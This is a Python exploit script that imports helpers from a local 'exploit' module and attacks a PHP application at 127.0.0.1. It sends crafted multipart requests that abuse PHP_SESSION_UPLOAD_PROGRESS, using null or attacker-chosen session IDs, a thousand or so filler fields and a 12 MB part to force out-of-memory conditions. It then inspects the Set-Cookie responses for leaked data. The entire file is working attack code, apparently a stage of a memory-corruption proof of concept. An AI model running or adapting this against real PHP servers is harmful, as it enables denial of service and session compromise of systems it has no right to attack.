import os
import sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import Target, build_multipart, parse_cookie
t = Target("http://127.0.0.1:18113/index.php", timeout=120, verbose=False)
SID = b"attacksessionid0001"
def filepart(): return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

def rotate():
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), {"name": "big", "data": b"B" * (12 * 1024 * 1024)}]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.3)
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20)
    time.sleep(0.5)

def stage2_reqb():
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(983):
        cnt = 16 if i == 406 else 1
        for j in range(cnt):
            parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * 16})
    return t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20)

def oom(nfields, fsize, big_mb):
    parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * fsize} for i in range(nfields)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), {"name": "big", "data": b"B" * (big_mb * 1024 * 1024)}]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.2)

# Test different field sizes for stage 2 OOM
for fsize in [1, 8, 39, 64]:
    rotate()
    oom(1001, fsize, 12)
    resp = stage2_reqb()
    if b"\r\n\r\n" in resp:
        head, body = resp.split(b"\r\n\r\n", 1)
    else:
        head, body = b"", resp
    has_cookie = b"Set-Cookie" in head
    raw = parse_cookie(resp)
    print(f"fsize={fsize}: resp={len(resp)}B head={len(head)}B Set-Cookie={has_cookie} cookie={len(raw) if raw else 0}B body={len(body)}B")
